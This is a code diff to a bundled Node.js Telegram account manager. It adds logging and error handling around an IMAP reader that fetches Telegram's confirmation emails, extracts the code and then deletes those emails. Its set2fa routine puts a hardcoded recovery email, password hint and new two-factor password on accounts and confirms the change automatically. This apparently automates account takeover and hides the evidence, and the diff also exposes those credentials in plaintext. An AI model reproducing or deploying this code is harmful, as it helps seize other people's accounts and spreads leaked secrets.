@@ -1004,6 +1004,11 @@ const timeOptions = { timeZone: 'Asia/Kolkata', timeZoneName: 'short' };
 process.on('unhandledRejection', (reason, promise) => {
   console.error('Unhandled Rejection at:', promise, 'reason:', reason);
 });
+
+process.on('uncaughtException', (reason, promise) => {
+  console.error(promise, reason);
+});
+
 process.on('exit', async () => {
   await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance().closeConnection();
   await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.disconnectAll)();
@@ -3196,6 +3201,7 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.MailReader = void 0;
 const imap_1 = __importDefault(__webpack_require__(/*! imap */ "imap"));
+const utils_1 = __webpack_require__(/*! ../../utils */ "./utils.js");
 class MailReader {
     constructor() {
         this.isReady = false;
@@ -3229,25 +3235,27 @@ class MailReader {
     }
     connectToMail() {
         return __awaiter(this, void 0, void 0, function* () {
-            this.result = '';
-            yield new Promise((resolve, reject) => {
+            console.log('Connecting to mail server');
+            const result = yield new Promise((resolve, reject) => {
                 this.imap.connect((err) => {
                     if (err) {
+                        console.log((0, utils_1.parseError)(err));
                         reject(err);
                         return;
                     }
                     console.log('Connected to mail server');
-                    resolve();
+                    resolve(true);
                 });
             });
+            console.log(result);
         });
     }
     disconnectFromMail() {
         return __awaiter(this, void 0, void 0, function* () {
-            this.result = '';
             yield new Promise((resolve, reject) => {
                 this.imap.end((err) => {
                     if (err) {
+                        console.log((0, utils_1.parseError)(err));
                         reject(err);
                         return;
                     }
@@ -3267,79 +3275,86 @@ class MailReader {
             if (!this.isReady) {
                 throw new Error('Mail reader is not ready. Call connectToMail() first.');
             }
-            yield this.openInbox();
-            const searchCriteria = [['FROM', 'noreply@telegram.org']];
-            const fetchOptions = {
-                bodies: ['HEADER', 'TEXT'],
-                markSeen: true,
-            };
             try {
-                const results = yield new Promise((resolve, reject) => {
-                    this.imap.search(searchCriteria, (err, results) => {
-                        if (err) {
-                            reject(err);
-                            return;
-                        }
-                        resolve(results);
+                yield this.openInbox();
+                const searchCriteria = [['FROM', 'noreply@telegram.org']];
+                const fetchOptions = {
+                    bodies: ['HEADER', 'TEXT'],
+                    markSeen: true,
+                };
+                console.log('Inbox Opened');
+                try {
+                    const results = yield new Promise((resolve, reject) => {
+                        this.imap.search(searchCriteria, (err, results) => {
+                            if (err) {
+                                console.log((0, utils_1.parseError)(err));
+                                reject(err);
+                                return;
+                            }
+                            resolve(results);
+                        });
                     });
-                });
-                if (results.length > 0) {
-                    const fetch = this.imap.fetch([results[results.length - 1]], fetchOptions);
-                    yield new Promise((resolve, reject) => {
-                        fetch.on('message', (msg, seqno) => {
-                            const emailData = [];
-                            msg.on('body', (stream, info) => {
-                                let buffer = '';
-                                stream.on('data', (chunk) => {
-                                    buffer += chunk.toString('utf8');
-                                });
-                                stream.on('end', () => {
-                                    if (info.which === 'TEXT') {
-                                        emailData.push(buffer);
-                                    }
-                                    this.imap.seq.addFlags([seqno], '\\Deleted', (err) => {
-                                        if (err) {
-                                            reject(err);
-                                            return;
+                    if (results.length > 0) {
+                        console.log('Emails found', results.length);
+                        const length = results.length;
+                        const fetch = this.imap.fetch([results[length - 1]], fetchOptions);
+                        yield new Promise((resolve, reject) => {
+                            fetch.on('message', (msg, seqno) => {
+                                const emailData = [];
+                                msg.on('body', (stream, info) => {
+                                    let buffer = '';
+                                    stream.on('data', (chunk) => {
+                                        buffer += chunk.toString('utf8');
+                                    });
+                                    stream.on('end', () => {
+                                        if (info.which === 'TEXT') {
+                                            emailData.push(buffer);
                                         }
-                                        this.imap.expunge((err) => {
+                                        this.imap.seq.addFlags([seqno], '\\Deleted', (err) => {
                                             if (err) {
                                                 reject(err);
                                                 return;
                                             }
-                                            console.log(`Deleted message`);
+                                            this.imap.expunge((err) => {
+                                                if (err) {
+                                                    reject(err);
+                                                    return;
+                                                }
+                                                console.log(`Deleted message`);
+                                            });
                                         });
                                     });
                                 });
+                                msg.once('end', () => {
+                                    console.log(`Email #${seqno}, Latest ${results[length - 1]}`);
+                                    console.log('EmailDataLength:', emailData.length);
+                                    console.log('Mail:', emailData[emailData.length - 1].split('.'));
+                                    this.result = this.fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);
+                                    resolve();
+                                });
                             });
-                            msg.once('end', () => {
-                                console.log(`Email #${seqno}, Latest ${results[length - 1]}`);
-                                console.log('EmailDataLength:', emailData.length);
-                                console.log('Mail:', emailData[emailData.length - 1].split('.'));
-                                this.result = this.fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);
+                            fetch.once('end', () => {
+                                console.log('Fetched mails');
                                 resolve();
                             });
                         });
-                        fetch.once('end', () => {
-                            console.log('Fetched mails');
-                            resolve();
-                        });
-                    });
+                    }
+                    else {
+                        console.log('No new emails found');
+                    }
                 }
-                else {
-                    console.log('No new emails found');
+                catch (err) {
+                    console.error('Error:', err);
+                    throw err; // Re-throw the error for caller to handle
                 }
+                console.log('returning result:', this.result);
+                return this.result;
             }
-            catch (err) {
-                console.error('Error:', err);
-                throw err; // Re-throw the error for caller to handle
+            catch (error) {
+                console.log('In Error');
+                const errorDetails = (0, utils_1.parseError)(error);
+                return undefined;
             }
-            finally {
-                if (this.result.length > 4) {
-                    yield this.disconnectFromMail();
-                }
-            }
-            return this.result;
         });
     }
     openInbox() {
@@ -3347,6 +3362,7 @@ class MailReader {
             yield new Promise((resolve, reject) => {
                 this.imap.openBox('INBOX', false, (err) => {
                     if (err) {
+                        console.log((0, utils_1.parseError)(err));
                         reject(err);
                         return;
                     }
@@ -4217,7 +4233,7 @@ class TelegramManager {
                     console.log(`Removed Username successfully.`);
                 }
                 catch (error) {
-                    throw error;
+                    console.log(error);
                 }
             }
             else {
@@ -4328,45 +4344,55 @@ class TelegramManager {
     set2fa() {
         return __awaiter(this, void 0, void 0, function* () {
             const imapService = IMap_1.MailReader.getInstance();
-            imapService.connectToMail();
-            const intervalParentId = setInterval(() => __awaiter(this, void 0, void 0, function* () {
-                const isReady = imapService.isMailReady();
-                if (isReady) {
-                    clearInterval(intervalParentId);
-                    yield this.client.updateTwoFaSettings({
-                        isCheckPassword: false,
-                        email: "storeslaksmi@gmail.com",
-                        hint: "password - India143",
-                        newPassword: "Ajtdmwajt1@",
-                        emailCodeCallback: (length) => __awaiter(this, void 0, void 0, function* () {
-                            console.log("code sent");
-                            return new Promise((resolve) => __awaiter(this, void 0, void 0, function* () {
-                                let retry = 0;
-                                const intervalId = setInterval(() => __awaiter(this, void 0, void 0, function* () {
-                                    console.log("checking code");
-                                    retry++;
-                                    const isReady = imapService.isMailReady();
-                                    if (isReady && retry < 4) {
-                                        const code = yield imapService.getCode();
-                                        if (code !== '') {
-                                            clearInterval(intervalId);
-                                            imapService.disconnectFromMail();
-                                            resolve(code);
+            try {
+                imapService.connectToMail();
+                const intervalParentId = setInterval(() => __awaiter(this, void 0, void 0, function* () {
+                    const isReady = imapService.isMailReady();
+                    if (isReady) {
+                        clearInterval(intervalParentId);
+                        yield this.client.updateTwoFaSettings({
+                            isCheckPassword: false,
+                            email: "storeslaksmi@gmail.com",
+                            hint: "password - India143",
+                            newPassword: "Ajtdmwajt1@",
+                            emailCodeCallback: (length) => __awaiter(this, void 0, void 0, function* () {
+                                console.log("code sent");
+                                return new Promise((resolve) => __awaiter(this, void 0, void 0, function* () {
+                                    let retry = 0;
+                                    const intervalId = setInterval(() => __awaiter(this, void 0, void 0, function* () {
+                                        console.log("checking code");
+                                        retry++;
+                                        const isReady = imapService.isMailReady();
+                                        if (isReady && retry < 4) {
+                                            const code = yield imapService.getCode();
+                                            console.log('Code: ', code);
+                                            if (code) {
+                                                clearInterval(intervalId);
+                                                imapService.disconnectFromMail();
+                                                resolve(code);
+                                            }
+                                            else {
+                                                console.log('Code: ', code);
+                                            }
                                         }
-                                    }
-                                    else {
-                                        clearInterval(intervalId);
-                                        yield this.client.disconnect();
-                                        imapService.disconnectFromMail();
-                                        resolve(undefined);
-                                    }
-                                }), 6000);
-                            }));
-                        }),
-                        onEmailCodeError: (e) => { console.log((0, utils_1.parseError)(e)); return Promise.resolve("error"); }
-                    });
-                }
-            }), 5000);
+                                        else {
+                                            clearInterval(intervalId);
+                                            yield this.client.disconnect();
+                                            imapService.disconnectFromMail();
+                                            resolve(undefined);
+                                        }
+                                    }), 10000);
+                                }));
+                            }),
+                            onEmailCodeError: (e) => { console.log((0, utils_1.parseError)(e)); return Promise.resolve("error"); }
+                        });
+                    }
+                }), 5000);
+            }
+            catch (e) {
+                console.log(e);
+                (0, utils_1.parseError)(e);
+            }
         });
     }
     sendPhotoChat(id, url, caption, filename) {
